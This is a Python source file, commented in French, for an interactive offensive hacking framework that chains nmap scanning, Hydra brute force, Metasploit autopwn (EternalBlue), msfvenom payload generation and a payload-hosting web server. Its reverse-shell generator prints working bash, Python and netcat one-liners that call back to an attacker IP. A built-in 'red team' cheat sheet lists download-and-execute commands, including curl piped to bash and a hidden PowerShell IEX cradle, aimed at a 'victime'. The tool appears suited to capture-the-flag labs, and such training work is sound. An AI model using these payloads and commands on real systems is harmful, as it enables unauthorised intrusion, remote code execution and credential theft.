import nmap
import subprocess
import os
import sys
from datetime import datetime
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.panel import Panel
import questionary
import http.server
import socketserver
import threading

console = Console()

donnees_rapport = {
    "cible": "", "date": "", "ports": [], "vulns": [], "mots_de_passe": []
}

# --- SYSTÈME D'AUTO-UPDATE (Secours interne) ---
def auto_update():
    if os.path.exists(".git"):
        console.print("[dim cyan][*] Recherche de mises à jour sur GitHub...[/dim cyan]")
        try:
            subprocess.run(["git", "fetch", "--all"], capture_output=True, timeout=5)
            subprocess.run(["git", "reset", "--hard", "origin/main"], capture_output=True, timeout=5)
            res = subprocess.run(["git", "pull"], capture_output=True, text=True, timeout=5)
            if "Already up to date" not in res.stdout and "files changed" in res.stdout:
                console.print("[bold yellow][!] Nouvelle version détectée et téléchargée ! Redémarrage...[/bold yellow]")
                os.execv(sys.executable, ['python'] + sys.argv)
        except Exception: pass

def ecrire_rapport(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if not os.path.exists("rapports"): os.makedirs("rapports")
    with open("rapports/rapport_audit.txt", "a") as f: f.write(f"[{timestamp}] {message}\n")

def generer_html():
    if not os.path.exists("rapports"): 
        os.makedirs("rapports")
        
    # --- Création du nom de fichier dynamique ---
    ip_cible = donnees_rapport['cible'].replace('/', '_') # Sécurité au cas où il y a un slash
    date_heure = datetime.now().strftime("%Y-%m-%d_%Hh%M")
    nom_fichier = f"rapports/{ip_cible}_{date_heure}.html"
    # --------------------------------------------

    html = f"<html><head><meta charset='utf-8'><title>Rapport - {donnees_rapport['cible']}</title></head>"
    html += f"<body style='font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; padding: 20px;'>"
    html += f"<h1 style='color: #00ff00;'>☠️ Rapport d'Audit : {donnees_rapport['cible']}</h1>"
    html += f"<h3 style='color: #aaaaaa;'>📅 Date de l'attaque : {datetime.now().strftime('%d/%m/%Y à %H:%M:%S')}</h3><hr>"
    html += "<h2>Vulnérabilités / Découvertes</h2><table border='1' style='border-collapse: collapse; width: 100%; text-align: left;'>"
    html += "<tr style='background: #333;'><th>Sévérité</th><th>Outil</th><th>Détail</th></tr>"
    
    if not donnees_rapport["vulns"]:
        html += "<tr><td colspan='3' style='text-align:center;'>Aucune vulnérabilité n'a été enregistrée pour cette session.</td></tr>"
    else:
        for v in donnees_rapport["vulns"]: 
            html += f"<tr><td>{v.get('severite', 'Info')}</td><td>{v['outil']}</td><td>{v['nom']}</td></tr>"
            
    html += "</table></body></html>"
    
    # On sauvegarde dans le fichier avec le nouveau nom unique
    with open(nom_fichier, "w", encoding="utf-8") as f: 
        f.write(html)
        
    console.print(f"\n[bold green]>>> 📄 Rapport sauvegardé avec succès : {nom_fichier} <<<[/bold green]")

# --- ÉTAPE 1 : SCAN (NMAP) ---
def scan_target(ip, agressif=False):
    donnees_rapport["cible"] = ip
    nm = nmap.PortScanner()
    results = []
    
    # Arguments par défaut
    args = '-Pn -sV -T4'
    msg = f"[bold green]Analyse furtive de {ip} en cours...[/bold green]"
    
    # Arguments si on choisit le scan poussé
    if agressif:
        args = '-Pn -sV -p- -T4' # -p- force le scan des 65535 ports existants
        msg = f"[bold red]Analyse AGRESSIVE (65535 ports) de {ip} en cours... (Patientez)[/bold red]"

    with console.status(msg):
        try:
            nm.scan(ip, arguments=args)
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        if nm[host][proto][port]['state'] == 'open':
                            p_info = {
                                'port': port, 
                                'service': nm[host][proto][port]['name'], 
                                'product': nm[host][proto][port].get('product', ''), 
                                'version': nm[host][proto][port].get('version', '')
                            }
                            results.append(p_info)
                            donnees_rapport["ports"].append(p_info)
        except Exception as e: console.print(f"[bold red]Erreur Nmap : {e}[/bold red]")
    return results

# --- ÉTAPE 2 : SEARCHSPLOIT INTELLIGENT (ANTI-SPAM V2) ---
def run_searchsploit(open_ports):
    console.print("\n[bold yellow][*] Recherche d'Exploits (Smart Mode V2)...[/bold yellow]")
    services_deja_vus = set()

    for p in open_ports:
        # On récupère le nom complet du produit ou du service
        produit_complet = p.get('product', '')
        if not produit_complet:
            produit_complet = p.get('service', '')

        # Nettoyage de la version (on ignore le mot "inconnue")
        version = p.get('version', '').split()[0] if p.get('version') else ""
        if version.lower() == "inconnue":
            version = ""

        if not produit_complet:
            continue

        # LE CERVEAU ANTI-SPAM : 
        # Si le nom commence par un mot très générique, on garde 2 mots au lieu d'un.
        mots = produit_complet.split()
        mots_generiques = ["microsoft", "apache", "nginx", "vmware", "oracle"]
        
        if len(mots) > 1 and mots[0].lower() in mots_generiques:
            terme_recherche = f"{mots[0]} {mots[1]}"  # Ex: "Microsoft HTTPAPI"
        else:
            terme_recherche = mots[0]  # Ex: "vsftpd"

        signature = f"{terme_recherche}_{version}"
        if signature in services_deja_vus:
            continue
        
        services_deja_vus.add(signature)
        
        console.print(f"\n[bold blue]🔍 Test générique : {terme_recherche}[/bold blue]")
        subprocess.run(["searchsploit", "--disable-colour", terme_recherche])
        
        if version:
            console.print(f"[bold magenta]🎯 Test précis : {terme_recherche} {version}[/bold magenta]")
            subprocess.run(["searchsploit", "--disable-colour", terme_recherche, version])
        else:
            console.print(f"[dim yellow]ℹ️ Version non détectée pour {terme_recherche}, scan précis ignoré.[/dim yellow]")

# --- ÉTAPE 3 : WEB (GOBUSTER DYNAMIQUE & ANTI-WILDCARD) ---
def run_web_enum(ip, open_ports):
    web_ports = [p['port'] for p in open_ports if p['port'] in [80, 443, 8080]]
    if not web_ports: return console.print("[bold red]Aucun port Web détecté.[/bold red]")
    
    console.print("\n[bold yellow][*] Création du dictionnaire 'Juicy' (Fusion propre)...[/bold yellow]")
    juicy_words = [
        "admin", "panel", "password", "pass", "user", "users", "login", 
        "backup", "db", "config", "secret", "api", "test", "dev", ".git", ".env"
    ]
    
    # 1. Fusion propre en Python (Corrige le bug 'cat >>')
    with open("juicy_words.txt", "w") as f:
        for word in juicy_words:
            f.write(f"{word}\n")
        # Si on a un fichier common.txt, on l'ajoute à la suite
        if os.path.exists("common.txt"):
            with open("common.txt", "r") as common_file:
                f.write(common_file.read())

    for port in web_ports:
        url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
        console.print(f"\n[bold cyan]=== Profilage WhatWeb pour {url} ===[/bold cyan]")
        try:
            res = subprocess.run(["whatweb", "--color=never", url], capture_output=True, text=True)
            if res.stdout:
                for techno in res.stdout.strip().split(', '): console.print(f"> {techno}")
        except Exception: pass

        console.print(f"\n[bold yellow][*] Fuzzing Gobuster en cours sur {url}...[/bold yellow]")
        
        # 2. Ajout de --wildcard pour contourner les protections F5 BIG-IP
        try:
            cmd = ["gobuster", "dir", "-u", url, "-w", "juicy_words.txt", "-q", "-t", "20"]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True)
            
            for line in process.stdout:
                # On affiche seulement ce qui est vraiment intéressant
                if "Status: 200" in line or "Status: 204" in line or "Status: 301" in line:
                    console.print(f"[bold green][+] {line.strip()}[/bold green]")
        except KeyboardInterrupt: 
            console.print("[dim yellow]Gobuster annulé par l'utilisateur.[/dim yellow]")
            pass

# --- ÉTAPE 4 : ARSENAL WINDOWS (WINRM & ENUM4LINUX) ---
def windows_arsenal(ip):
    console.print("\n[bold cyan]🪟  ARSENAL WINDOWS 🪟[/bold cyan]")
    table = Table(show_header=False)
    table.add_row("1", "Enum4Linux (Scan complet SMB/Utilisateurs/Domaine)")
    table.add_row("2", "Evil-WinRM (Connexion Shell via Hash/Mot de passe)")
    console.print(table)
    
    choix = questionary.select("Choisis ton arme :", choices=["1", "2"]).ask()
    
    if choix == "1":
        console.print(f"\n[bold yellow][*] Lancement d'Enum4Linux sur {ip}...[/bold yellow]")
        subprocess.run(["enum4linux", "-a", ip])
    elif choix == "2":
        user = questionary.text("Nom d'utilisateur :").ask()
        password = questionary.text("Mot de passe ou Hash NTLM :").ask()
        console.print(f"\n[bold yellow][*] Connexion WinRM en cours...[/bold yellow]")
        subprocess.run(["evil-winrm", "-i", ip, "-u", user, "-p", password])

# --- ÉTAPE 5 : BRUTEFORCE (HYDRA) ---
def run_hydra(ip, open_ports):
    cibles = [p for p in open_ports if any(s in p['service'].lower() for s in ['ssh', 'ftp'])]
    if not cibles: return console.print("[bold red]Aucun port bruteforçable détecté.[/bold red]")
    for i, p in enumerate(cibles): console.print(f"{i+1}. Port {p['port']} ({p['service']})")
    choix = int(Prompt.ask("Service ?", choices=[str(i+1) for i in range(len(cibles))])) - 1
    cible = cibles[choix]
    user = questionary.text("Utilisateur à attaquer :", default="root").ask()
    
    try:
        process = subprocess.Popen(["hydra", "-l", user, "-P", "common.txt", "-t", "4", "-s", str(cible['port']), f"{cible['service']}://{ip}"], stdout=subprocess.PIPE, text=True)
        for line in process.stdout:
            if "login:" in line.lower(): console.print(f"[bold green]>>> SUCCÈS : {line.strip()} <<<[/bold green]")
    except Exception as e: console.print(f"[bold red]Erreur : {e}[/bold red]")

# --- ÉTAPE 6 : PRIVESC (SUID) ---
def run_suid_helper():
    console.print(Panel("[bold red]LANCE CETTE COMMANDE SUR LA CIBLE (SSH/Shell) :[/bold red]\n\n[green]find / -perm -u=s -type f 2>/dev/null[/green]", title="Escalade SUID"))

# --- ÉTAPE 7 : REVERSE SHELLS (AVEC PWNCAT C2) ---
def run_payload_generator():
    console.print("\n[bold red]☠️  USINE À REVERSE SHELLS (SUPER C2) ☠️[/bold red]")
    ip = questionary.text("Ton IP d'écoute (ex: tun0) :").ask()
    port = questionary.text("Ton port d'écoute :", default="4444").ask()
    
    console.print(f"\n[bold yellow][*] Ouverture du Super Listener (Pwncat) sur le port {port}...[/bold yellow]")
    try:
        # Pwncat stabilisera le shell automatiquement. S'il plante, on fallback sur Netcat.
        cmd_listener = f"bash -c 'sudo pwncat-cs -lp {port} || sudo nc -lvnp {port}; exec bash'"
        subprocess.Popen(["x-terminal-emulator", "-e", cmd_listener])
        console.print("[bold green][+] Fenêtre du C2 ouverte ! (Fais Ctrl+D pour revenir au framework local quand tu auras le shell)[/bold green]\n")
    except Exception as e:
        console.print(f"[dim red]Échec de l'ouverture auto, lance : sudo pwncat-cs -lp {port}[/dim red]\n")

    table = Table(title=f"Payloads pour {ip}:{port}", show_lines=True)
    table.add_column("Type", style="magenta"); table.add_column("Commande", style="green")
    table.add_row("Bash", f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'")
    table.add_row("Python3", f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{int(port)}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'")
    table.add_row("Netcat", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
    console.print(table)

# --- ÉTAPE 8 : METASPLOIT AUTO-PWNER ---
def metasploit_autopwn(ip):
    console.print("\n[bold red]🎯 AUTO-PWN METASPLOIT 🎯[/bold red]")
    
    choix = questionary.select(
        "Choisis ton missile automatique :",
        choices=[
            "1. Icecast Header (CVE-2004-1561) - Port 8000",
            "2. EternalBlue (MS17-010) - Port 445",
            "3. Exploit sur mesure (Manuel)",
            "4. Retour"
        ]
    ).ask()
    
    if not choix or "4." in choix:
        return

    lhost = questionary.text("Ton interface VPN ou IP (ex: tun0) :", default="tun0").ask()
    
    exploit_path = ""
    rport = ""
    
    if "1." in choix:
        exploit_path = "exploit/windows/http/icecast_header"
        rport = "8000"
    elif "2." in choix:
        exploit_path = "exploit/windows/smb/ms17_010_eternalblue"
        rport = "445"
    elif "3." in choix:
        exploit_path = questionary.text("Chemin exact de l'exploit :").ask()
        rport = questionary.text("Port cible (RPORT) :").ask()

    console.print(f"\n[bold yellow][*] Armement du missile sur {ip}...[/bold yellow]")
    
    # Création du script de lancement automatique pour Metasploit
    rc_file = "autopwn.rc"
    with open(rc_file, "w") as f:
        f.write(f"use {exploit_path}\n")
        f.write(f"set RHOSTS {ip}\n")
        if rport:
            f.write(f"set RPORT {rport}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write("show options\n")
        f.write("echo -e '\\n\\033[1;32m[*] CIBLE VEROUILLÉE ! TAPE \"run\" POUR FAIRE FEU !\\033[0m\\n'\n")
    
    console.print("[bold green][+] Lancement de Metasploit avec les paramètres injectés...[/bold green]")
    try:
        # Lance Metasploit silencieusement (-q) et execute le script (-r)
        subprocess.run(["msfconsole", "-q", "-r", rc_file])
    except Exception as e:
        console.print(f"[bold red]Erreur lors du lancement de Metasploit : {e}[/bold red]")


# --- MODULE DE CARTOGRAPHIE RÉSEAU (Vue Globale) ---
def scan_network(network):
    console.print(f"\n[bold yellow][*] Déploiement du radar sur le réseau {network}...[/bold yellow]")
    nm = nmap.PortScanner()
    
    with console.status(f"[bold green]Cartographie en cours (Ping + Fast Scan des ports)...[/bold green]"):
        try:
            nm.scan(hosts=network, arguments='-Pn -F -sV -T4') 
        except Exception as e:
            console.print(f"[bold red]Erreur de scan réseau : {e}[/bold red]")
            return []
            
    hosts = nm.all_hosts()
    if not hosts:
        console.print("[bold red]❌ Aucune machine trouvée sur ce réseau.[/bold red]")
        return []
        
    console.print("\n[bold cyan]📡 CARTOGRAPHIE DU RÉSEAU 📡[/bold cyan]")
    table = Table(show_header=True, header_style="bold magenta", border_style="blue")
    table.add_column("Adresse IP", style="green")
    table.add_column("Nom d'hôte", style="yellow")
    table.add_column("Ports Ouverts (Services)", style="cyan")
    
    choix_menu = []
    
    for host in hosts:
        hostname = nm[host].hostname() if nm[host].hostname() else "Inconnu"
        ports_trouves = []
        
        for proto in nm[host].all_protocols():
            for port in nm[host][proto].keys():
                if nm[host][proto][port]['state'] == 'open':
                    service = nm[host][proto][port]['name']
                    ports_trouves.append(f"{port} ({service})")
        
        ports_str = ", ".join(ports_trouves) if ports_trouves else "Aucun port standard"
        table.add_row(host, hostname, ports_str)
        
        # Ajout à la liste mémoire
        choix_menu.append(f"{host} - {hostname}")
        
    console.print(table)
    console.print("\n")
    
    # On ajoute l'option de sortie à la fin de la liste
    choix_menu.append("❌ Quitter ce réseau (Scanner autre chose)")
    return choix_menu

# --- ÉTAPE 9 : CASSEUR DE HASHS (JOHN THE RIPPER) ---
def run_cracker():
    console.print("\n[bold red]💀 MODULE DE CRACKING (John The Ripper) 💀[/bold red]")
    
    hash_input = questionary.text("Colle le HASH ici (ou le chemin exact vers le fichier txt) :").ask()
    if not hash_input: return
    
    # Si l'utilisateur a collé directement le hash (ce n'est pas un fichier)
    target_file = hash_input
    if not os.path.exists(hash_input):
        target_file = "temp_hash.txt"
        with open(target_file, "w") as f:
            f.write(hash_input)
            
    wordlist = questionary.text(
        "Chemin de la wordlist :", 
        default="/usr/share/wordlists/rockyou.txt"
    ).ask()
    
    console.print("\n[bold yellow][*] Les moteurs chauffent... John The Ripper est en cours ! (Fais Ctrl+C pour arrêter)[/bold yellow]")
    try:
        # Lancement du crack
        subprocess.run(["john", f"--wordlist={wordlist}", target_file])
        
        # Affichage du résultat en clair
        console.print("\n[bold green]RÉSULTATS DU CRACKING :[/bold green]")
        subprocess.run(["john", "--show", target_file])
    except Exception as e:
        console.print(f"[bold red]Erreur avec John : {e}[/bold red]")


# --- ÉTAPE 10 : SCANNER DE VULNÉRABILITÉS WEB (NIKTO) ---
def run_vuln_scanner(ip, open_ports):
    web_ports = [p['port'] for p in open_ports if p['port'] in [80, 443, 8080]]
    if not web_ports: 
        return console.print("[bold red]❌ Impossible : Aucun port Web (80, 443, 8080) détecté sur cette cible.[/bold red]")
    
    console.print("\n[bold red]☢️ SCANNER DE VULNÉRABILITÉS WEB (Nikto) ☢️[/bold red]")
    console.print("[dim]Note : Ce scan est très bruyant et agressif. Il cherche les vieilles failles, les erreurs de config et les fichiers dangereux.[/dim]")
    
    for port in web_ports:
        url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
        console.print(f"\n[bold yellow][*] Tir de barrage Nikto sur {url}... (Patiente, ça peut être long)[/bold yellow]")
        
        try:
            # -Tuning 123b : On cible les fichiers intéressants, les mauvaises configs, et on évite le déni de service
            subprocess.run(["nikto", "-h", url, "-Tuning", "123b"])
        except KeyboardInterrupt:
            console.print("[dim yellow]Scan Nikto annulé par l'opérateur.[/dim yellow]")
        except Exception as e:
            console.print(f"[bold red]Erreur avec Nikto : {e}[/bold red]")


# --- ÉTAPE 11 : SERVEUR DE DISTRIBUTION DE PAYLOADS ---
def serve_payloads():
    console.print("\n[bold red]🚁 SERVEUR DE LARGAGE DE CHARGES UTILES 🚁[/bold red]")
    
    port_input = questionary.text("Sur quel port ouvrir le serveur (ex: 8080) ?", default="8080").ask()
    if not port_input: return
    try:
        PORT = int(port_input)
    except:
        return console.print("[bold red]Port invalide.[/bold red]")
    
    # Création du dossier d'armes s'il n'existe pas
    dossier_outils = "arsenal_payloads"
    if not os.path.exists(dossier_outils):
        os.makedirs(dossier_outils)
        console.print(f"[dim yellow][*] Création du dossier '{dossier_outils}'. Glisse tes scripts (LinPEAS, virus, etc.) à l'intérieur ![/dim yellow]")

    # Configuration du mini-serveur Web pointant uniquement sur le dossier d'armes
    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=dossier_outils, **kwargs)
        def log_message(self, format, *args):
            # Affiche un message quand la victime télécharge un fichier !
            console.print(f"[bold magenta]👀 [ALERTE] Connexion entrante : {self.address_string()} a demandé {args[0]}[/bold magenta]")

    httpd = socketserver.TCPServer(("", PORT), Handler)

    def start_server():
        httpd.serve_forever()

    # Lancement en tâche de fond pour ne pas bloquer le framework
    t = threading.Thread(target=start_server, daemon=True)
    t.start()
    
    console.print(f"\n[bold green]✅ Serveur de largage actif sur le port {PORT} ![/bold green]")
    console.print(f"[cyan]Commande à taper sur la machine cible (Linux) :[/cyan] wget http://<TON_IP_VPN>:{PORT}/linpeas.sh")
    console.print(f"[cyan]Commande à taper sur la machine cible (Windows) :[/cyan] certutil -urlcache -split -f http://<TON_IP_VPN>:{PORT}/winpeas.exe\n")
    
    questionary.text("Appuie sur Entrée pour couper le serveur et revenir au menu...").ask()
    httpd.shutdown()
    console.print("[dim]Serveur coupé. Retour à la base.[/dim]")

# --- ÉTAPE 12 : USINE À REVERSE SHELLS (MSFVENOM) ---
def generate_payload():
    console.print("\n[bold red]☣️ USINE À REVERSE SHELLS (Générateur msfvenom) ☣️[/bold red]")
    
    # Création du dossier d'armes s'il n'existe pas déjà
    dossier_outils = "arsenal_payloads"
    if not os.path.exists(dossier_outils):
        os.makedirs(dossier_outils)

    choix_os = questionary.select(
        "Pour quel système veux-tu forger une arme ?",
        choices=[
            "1. Windows (.exe) - Meterpreter",
            "2. Linux (.elf) - Bash standard",
            "3. Web (.php) - Idéal pour les failles d'upload",
            "4. Annuler"
        ]
    ).ask()

    if not choix_os or "4." in choix_os: return

    lhost = questionary.text("Ton adresse IP attaquante (LHOST, ex: tun0) :", default="tun0").ask()
    lport = questionary.text("Ton port d'écoute (LPORT, ex: 4444) :", default="4444").ask()
    nom_fichier = questionary.text("Nom du fichier de sortie :", default="payload").ask()

    # Configuration des paramètres selon l'OS choisi
    if "1." in choix_os:
        payload = "windows/x64/meterpreter/reverse_tcp"
        format_out = "exe"
        ext = ".exe"
    elif "2." in choix_os:
        payload = "linux/x64/shell_reverse_tcp"
        format_out = "elf"
        ext = ".elf"
    elif "3." in choix_os:
        payload = "php/reverse_php"
        format_out = "raw"
        ext = ".php"

    chemin_final = os.path.join(dossier_outils, f"{nom_fichier}{ext}")

    console.print(f"\n[bold yellow][*] Forge en cours : Création de {chemin_final}...[/bold yellow]")
    
    try:
        # Lancement de la commande msfvenom
        commande = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", format_out, "-o", chemin_final]
        subprocess.run(commande, check=True)
        console.print(f"[bold green]✅ Payload généré avec succès dans '{chemin_final}' ![/bold green]")
        console.print(f"[dim]Astuce : Ouvre un terminal et tape 'nc -lvnp {lport}' pour écouter la connexion entrante (sauf pour meterpreter où tu dois utiliser msfconsole).[/dim]\n")
    except Exception as e:
        console.print(f"[bold red]Erreur lors de la génération : {e}[/bold red]")


# --- ÉTAPE 13 : BIBLIOTHÈQUE RED TEAM (CHEAT SHEET) ---
def show_help_menu():
    console.print("\n")
    
    astuces = """
[bold cyan]=== 🐧 COMMANDES LINUX (Téléchargement & Exécution) ===[/bold cyan]

[yellow]1. La méthode classique (wget / curl)[/yellow]
Victime> wget http://<TON_IP>:8080/shell.elf -O /tmp/shell.elf
Victime> curl http://<TON_IP>:8080/shell.elf -o /tmp/shell.elf

[yellow]2. Donner les droits d'exécution (CRUCIAL)[/yellow]
Si tu ne fais pas ça, Linux refusera de lancer le virus :
Victime> chmod +x /tmp/shell.elf

[yellow]3. Exécuter le payload[/yellow]
Victime> /tmp/shell.elf &  [dim](Le '&' permet de le lancer en arrière-plan sans bloquer le terminal actuel)[/dim]

[yellow]4. L'attaque Fileless (Sans toucher le disque dur - Furtif)[/yellow]
Télécharge et exécute directement en mémoire vive (RAM) :
Victime> curl http://<TON_IP>:8080/shell.sh | bash


[bold cyan]=== 🪟 COMMANDES WINDOWS (Téléchargement & Exécution) ===[/bold cyan]

[yellow]1. Certutil (La méthode de bourrin, souvent bloquée par l'antivirus)[/yellow]
Victime> certutil -urlcache -split -f http://<TON_IP>:8080/virus.exe C:\\Temp\\virus.exe

[yellow]2. PowerShell (Plus moderne et efficace)[/yellow]
Victime> powershell -c "Invoke-WebRequest -Uri http://<TON_IP>:8080/virus.exe -OutFile C:\\Temp\\virus.exe"

[yellow]3. Exécution[/yellow]
Victime> C:\\Temp\\virus.exe

[yellow]4. L'attaque Fileless PowerShell (Furtif)[/yellow]
Victime> powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<TON_IP>:8080/shell.ps1')"


[bold cyan]=== 🛠️ ASTUCE : STABILISER UN SHELL LINUX ===[/bold cyan]
Quand tu attrapes un Reverse Shell netcat, il est souvent buggé (tu ne peux pas faire de flèche du haut, ni Ctrl+C). Tape ça pour le rendre parfait :
1. python3 -c 'import pty; pty.spawn("/bin/bash")'
2. Fais Ctrl+Z (ça met le shell en pause)
3. Tape sur TA Kali : stty raw -echo; fg
4. Tape : export TERM=xterm
    """
    
    # On affiche tout ça dans un beau cadre Red Team
    console.print(Panel(astuces, title="[bold red]💀 ANTI-SÈCHE RED TEAM 💀[/bold red]", border_style="red", expand=False))
    
    questionary.text("Appuie sur Entrée pour fermer le manuel et retourner au combat...").ask()

# --- MENU PRINCIPAL (INTERACTIF) ---
def interactive_menu(ip, open_ports):
    while True:
        table = Table(title=f"Arsenal Pointé sur : {ip}", border_style="blue")
        table.add_column("Port", style="cyan")
        table.add_column("Service", style="magenta")
        table.add_column("Version", style="yellow")
        for p in open_ports: 
            table.add_row(str(p['port']), p['product'] or p['service'], p['version'] or "Inconnue")
        console.print(table)
        
        choix = questionary.select(
            "💻 Que voulez-vous faire ?",
            choices=[
                "1. Recherche d'exploits (Searchsploit Intelligent)",
                "2. Énumération Web (WhatWeb & Gobuster Dynamique)",
                "3. Arsenal Windows (Enum4Linux & WinRM)",
                "4. Bruteforce (Hydra)",
                "5. Usine à Reverse Shells (Super C2 Pwncat)",
                "6. Aide Escalade de Privilèges (SUID)",
                "7. Metasploit Auto-Pwner (Armement auto)",
                "8. 💀 Cassage de Hashs hors-ligne (John The Ripper)",
                "9. ☢️ Scanner de Vulnérabilités Web (Nikto)",
                "10. 🚁 Héberger/Distribuer des payloads (Serveur Web local)",
                "11. ☣️ Usine à Reverse Shells (Générer des Payloads)",
                "12. 📖 Bibliothèque Red Team (Guide & Astuces)",
                "13. 🚪 Générer Rapport & Quitter"
            ]
        ).ask()
        
        if not choix: sys.exit()
        
        if "1." in choix: run_searchsploit(open_ports)
        elif "2." in choix: run_web_enum(ip, open_ports)
        elif "3." in choix: windows_arsenal(ip)
        elif "4." in choix: run_hydra(ip, open_ports)
        elif "5." in choix: run_payload_generator()
        elif "6." in choix: run_suid_helper()
        elif "7." in choix: metasploit_autopwn(ip)
        elif "8." in choix: run_cracker()
        elif "9." in choix: run_vuln_scanner(ip, open_ports)
        elif "10." in choix: serve_payloads()
        elif "11." in choix: generate_payload()
        elif "12." in choix: show_help_menu()
        elif "13." in choix:
            generer_html()
            break


if __name__ == "__main__":
    auto_update()
    console.print(Panel.fit("[bold red]CYBER FRAMEWORK V16.10[/bold red]", subtitle="hiiro_absolute"))
    
    cache_reseau = [] # La mémoire qui garde les machines du réseau !

    while True:
        cible = ""
        
        # SI ON A UN RÉSEAU EN MÉMOIRE
        if cache_reseau:
            selection = questionary.select(
                "🎯 Radar Actif : Choisis ta prochaine victime (Use arrow keys) :",
                choices=cache_reseau
            ).ask()
            
            if not selection or "❌ Quitter ce réseau" in selection:
                cache_reseau = [] # On vide la mémoire
                continue # On recommence la boucle pour demander une nouvelle IP
                
            cible = selection.split(" - ")[0]
            
        # SI LA MÉMOIRE EST VIDE (Nouveau scan)
        else:
            entree_brute = questionary.text("IP de la cible ou Réseau (ex: 192.168.1.0/24) :").ask()
            if not entree_brute: sys.exit()
            cible_saisie = entree_brute.replace("https://", "").replace("http://", "")
            
            # Si l'utilisateur tape un réseau
            if "/" in cible_saisie or "-" in cible_saisie or cible_saisie.endswith(".0"):
                cache_reseau = scan_network(cible_saisie)
                continue # On relance la boucle, ce qui va ouvrir le menu avec les flèches !
            else:
                cible = cible_saisie # C'est une IP unique

        # -- ON LANCE L'ATTAQUE SUR LA CIBLE --
        donnees_rapport = {"cible": cible, "date": "", "ports": [], "vulns": [], "mots_de_passe": []}
        ports = scan_target(cible)
        
        if ports: 
            interactive_menu(cible, ports)
            # Quand tu fais "Quitter" dans le menu interactif, le code arrive ici.
            # La boucle while True recommence. Si le cache_reseau est plein, il te réaffiche la liste !
        else: 
            console.print("\n[bold red]❌ Aucun port standard trouvé ou cible injoignable.[/bold red]")
            choix_fail = questionary.select(
                "Que voulez-vous faire ?",
                choices=[
                    "1. 🚀 Lancer un scan AGRESSIF (Tous les 65535 ports)",
                    "2. 🔄 Scanner une autre cible",
                    "3. 🚪 Quitter"
                ]
            ).ask()

            if not choix_fail or "3." in choix_fail:
                sys.exit()
            elif "1." in choix_fail:
                ports = scan_target(cible, agressif=True)
                if ports:
                    interactive_menu(cible, ports)
                else:
                    console.print("\n[bold red]☠️ Même en mode agressif, la cible est verrouillée.[/bold red]\n")
            # Si option 2, on ne fait rien, la boucle recommence.